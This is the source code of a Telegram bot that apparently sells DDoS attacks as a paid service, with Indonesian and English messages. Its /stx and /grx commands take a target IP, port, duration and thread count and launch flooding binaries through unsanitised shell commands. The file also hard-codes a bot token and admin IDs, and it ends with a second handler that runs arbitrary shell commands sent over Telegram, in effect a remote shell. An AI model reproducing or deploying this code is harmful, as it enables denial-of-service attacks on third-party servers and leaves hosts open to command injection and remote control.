import telebot
import subprocess
import requests
import datetime
import os
import threading
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

# Insert your Telegram bot token here
bot = telebot.TeleBot('7932562452:AAHllBiuVC_bT_wpbHHoHn-VuTiJOLL1bCg')

# Admin user IDs
admin_id = ["7316824198"]
ADMINS = [7316824198]
mimin = 7316824198
ALLOWED_USER_ID = 7316824198

# File to store allowed user IDs
USER_FILE = "stxusers.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Allowed Groups
ALLOWED_GROUPS = {-1002573717371} #grp chat id

# Cooldown Dictionary
attack_cooldown = {}

# Cooldown Time (in seconds)
COOLDOWN_TIME = 10  # 80 sec



# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
        
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧...")
        time.sleep(2)
        subprocess.run("nohup python3 stx.py", shell=True)
        bot.send_message(message.chat.id, "✅ DDOS READY...")
    else:
        bot.reply_to(message, "🚫 ERROR !")
        
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE.."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE.."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE.."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE.."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE.."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: MLBB"
    bot.reply_to(message, response)

# Dictionary to store the state of each user
user_state = {}

# Dictionary to store ongoing attacks
ongoing_attacks = {}


@bot.message_handler(commands=['grx'])
def handle_attack(message):
    global attack_cooldown

    user_id = message.from_user.id
    chat_id = message.chat.id
    current_time = time.time()

    # Check if bot is in an allowed group
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ HAYO MAU NGAPAIN, BUY CHAT AJA : @KECEE_PYRITE.")
        return

    # Check cooldown
    if user_id in attack_cooldown and current_time - attack_cooldown[user_id] < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[user_id]))
        bot.reply_to(message, f"⏳ Cooldown Ya Ganteng! ! !")
        return

    # Parse command arguments
    command_parts = message.text.split()
    if len(command_parts) != 5:
        bot.reply_to(message, "✅ Penggunaan: /grx <ip> <port> <durasi> <thread>\n\nKirim aja anu-nya 🙄\n\nThread-nya segini ya bang 200 - 1500 thread 💥")
        return

    target, port, durasi, thread = command_parts[1], command_parts[2], command_parts[3], command_parts[4]

    try:
        port = int(port)       
        thread = int(thread)       
        
        if thread > 1500:
            bot.reply_to(message, "❌ Error: Kebanyakan ganteng, maks 1500 thread.")
            return
        
        # Update cooldown time
        attack_cooldown[user_id] = current_time

        # Execute attack (Replace with actual command)
        attack_command = f"./depstx {target} {port} {durasi} {thread}"
        bot.reply_to(message, f"🔥 Kamu mau makai {thread} thread ya? 🤔 \n\n🔥 Proses pelan - pelan pak sopir, lagi ngirim nganu {thread} biji ke {target} {port} dalam 69 detik, canda yaa 😂 kirimnya {durasi} detik aja ya ganteng 🫠")
        subprocess.run(attack_command, shell=True)
        bot.reply_to(message, f"🔥 Ya nggak tau kok tanya saya ! ! ! \n💥 Yanto Kates 🙄 ! ! !\n\nDone, diem² aja ya jangan kasih tau moonton 🤫🧏‍♂️")

    except ValueError:
        bot.reply_to(message, "❌ Port salah woilah ! 🙄.")
        
        
# Handler for /bgmi command Private
@bot.message_handler(commands=['stx'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in ongoing_attacks:
            bot.reply_to(message, "An attack is already in progress. Please wait until it's finished.")
            return

        user_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter target IP address:\n Example : 115.84.125.xx")
    else:
        response = "❌ HAYO MAU NGAPAIN, BUY CHAT AJA : @KECEE_PYRITE"
        bot.reply_to(message, response)


@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_bgmi_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port:\n Example : 5xxx")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add( 
                InlineKeyboardButton("60 sec", callback_data="60"),
                InlineKeyboardButton("120 sec", callback_data="120"),
                InlineKeyboardButton("180 sec", callback_data="180"),
                InlineKeyboardButton("300 sec", callback_data="300"),
                
            )
            bot.reply_to(message, "Choose duration:", reply_markup=markup)
        except ValueError:
            bot.reply_to(message, "Invalid port. Please enter a numeric value for the port:")

@bot.callback_query_handler(func=lambda call: True)
def handle_duration_choice(call):
    user_id = str(call.message.chat.id)
    if user_id in user_state:
        state = user_state[user_id]
        try:
            state['time'] = int(call.data)
            if state['time'] > 600:
                bot.reply_to(call.message, "Error: Time interval must be less than 600 seconds.")
            else:
                if user_id in ongoing_attacks:
                    bot.reply_to(call.message, "An attack is already in progress. Please wait until it's finished.")
                    return

                record_command_logs(user_id, '/stx', state['target'], state['port'], state['time'])
                log_command(user_id, state['target'], state['port'], state['time'])
                ongoing_attacks[user_id] = True
                start_attack_reply(call.message, state['target'], state['port'], state['time'])
                full_command = f"./depstx {state['target']} {state['port']} {state['time']} 300"
                subprocess.run(full_command, shell=True)
                bot.reply_to(call.message, f"Sutax Attack Finished. Target: {state['target']} Port: {state['port']} Duration: {state['time']} seconds")
                del ongoing_attacks[user_id]
            del user_state[user_id]  # Clear the state for the user
        except ValueError:
            bot.reply_to(call.message, "Invalid Command:")
            
@bot.message_handler(commands=['yyy'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in ongoing_attacks:
            bot.reply_to(message, "An attack is already in progress. Please wait until it's finished.")
            return

        user_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter target IP address:\n Example : 115.84.125.xx")
    else:
        response = " You Are Not Authorized To Use This Command ."
        bot.reply_to(message, response)


@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_bgmi_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port:\n Example : 5xxx")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add(
                InlineKeyboardButton("180 sec", callback_data="180"),
            )
            bot.reply_to(message, "Choose duration:", reply_markup=markup)
        except ValueError:
            bot.reply_to(message, "Invalid port. Please enter a numeric value for the port:")

@bot.callback_query_handler(func=lambda call: True)
def handle_duration_choice(call):
    user_id = str(call.message.chat.id)
    if user_id in user_state:
        state = user_state[user_id]
        try:
            state['time'] = int(call.data)
            if state['time'] > 600:
                bot.reply_to(call.message, "Error: Time interval must be less than 600 seconds.")
            else:
                if user_id in ongoing_attacks:
                    bot.reply_to(call.message, "An attack is already in progress. Please wait until it's finished.")
                    return

                record_command_logs(user_id, '/ctr', state['target'], state['port'], state['time'])
                log_command(user_id, state['target'], state['port'], state['time'])
                ongoing_attacks[user_id] = True
                start_attack_reply(call.message, state['target'], state['port'], state['time'])
                full_command = f"./si {state['target']} {state['port']} {state['time']} 200"
                subprocess.run(full_command, shell=True)
                bot.reply_to(call.message, f"Counter Attack Finished. Target: {state['target']} Port: {state['port']} Duration: {state['time']} seconds")
                del ongoing_attacks[user_id]
            del user_state[user_id]  # Clear the state for the user
        except ValueError:
            bot.reply_to(call.message, "Invalid Command:")


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['settings'])
def show_settings(message):
    settings_text ='''🤖 Available commands:
➡️ TO START ATTACK(private) : /stx 

➡️ TO START ATTACK(group) : /grx 

➡️ CHECK RULES BEFORE USE : /rules

➡️ CHECK YOUR RECENT LOGS : /mylogs

➡️ SERVER FREEZE PLANS : /plan

➡️ CHECK YOUR ID : /id

 ADMIN CONTROL:-
 
➡️ ADMIN CONTROL SETTINGS : /admin

Buy From :- @Kecee_Pyrite

Official Channel :- 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/settings'):
                settings_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                settings_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, settings_text)

@bot.message_handler(commands=['stxtamfan'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    username = message.from_user.username
    
    response = f'''😍 Welcome VVIP User,
    
{user_name} ! ! !\nPlease Read Information Down Bellow for Run the Bot\n
    
➡️ To Start Attack :\n /stx (private)\n
    
➡️ To Start Attack :\n /grx (group)\n 
    
➡️ To Run This Command : /settings 

➡️ Support me : @Kecee_Pyrite\n\nWANT TO BUY CHAT ME : @KECEE_PYRITE'''
    
    admin_message = f"New user started the bot:\nUsername: @{username}\nUser ID: {user_id}"
    
    # Send a message to the admin
    for admin in admin_id:
        bot.send_message(admin, admin_message)
    
    bot.reply_to(message, response)
    

@bot.message_handler(commands=['grc'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''Gunakan dulu /grx untuk group /stx untuk private'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['start'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''CILUPPP BAAAAA ! ! ! \n\nHehehe mau cek fitur yaa ? 🤔 \n\nKlik aja ini /stxtamfan 🤫'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Baca aturannya yakk :

1. Plis jangan dispam bang nanti VPS kena suspen 😭😭 '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, WANT TO BUY CHAT ME : @KECEE_PYRITE
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

➡️ /add <userId> : Add a User.
➡️ /remove <userid> Remove a User.
➡️ /allusers : Authorised Users Lists.
➡️ /logs : All Users Logs.
➡️ /broadcast : Broadcast a Message.
➡️ /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE.."

    bot.reply_to(message, response)

# Function to send the /start command every 30 seconds
def send_start_command():
    while True:
        try:
            bot.send_message(admin_id[0], 'DDOS READY')
            time.sleep(3600)
        except Exception as e:
            print(f"Error sending server running... command: {e}")
            time.sleep(3600)

# Start the thread that sends the /start command
start_thread = threading.Thread(target=send_start_command)
start_thread.daemon = True  # Ensure it exits when the main program exits
start_thread.start()

# Function to print "running <number>" every second
app = Flask(__name__)

@app.route('/')
def index():
    return "Alive"

def run():
    app.run(host='0.0.0.0', port=29789)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Main script
if __name__ == "__main__":
    keep_alive()
    while True:
        try:
            bot.polling(none_stop=True)  # Ensure 'bot' is defined in your context
        except Exception as e:
            print(e)

# Store user's current working directory
current_dir = os.path.expanduser("~")  # Default: home directory

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Kamu siapa?")
        return

    command = update.message.text.strip()

    # If it's a "cd" command, update the current directory
    if command.startswith("cd "):
        path = command[3:].strip()
        new_dir = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_dir):
            current_dir = new_dir
            await update.message.reply_text(f"cd {current_dir}")
        else:
            await update.message.reply_text(f"No such directory: {new_dir}")
        return

    # Run the command in the current directory
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_dir,
            timeout=600
        )
        output = result.stdout.strip() + "\n" + result.stderr.strip()
        output = output.strip()
        if not output:
            output = "root@stxtamfan:~#"
    except Exception as e:
        output = f"Error: {str(e)}"

    # Send output in chunks if long
    for i in range(0, len(output), 4000):
        await update.message.reply_text(output[i:i+4000])

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_command))

if __name__ == '__main__':
    print("Bot running...")
    app.run_polling()
    
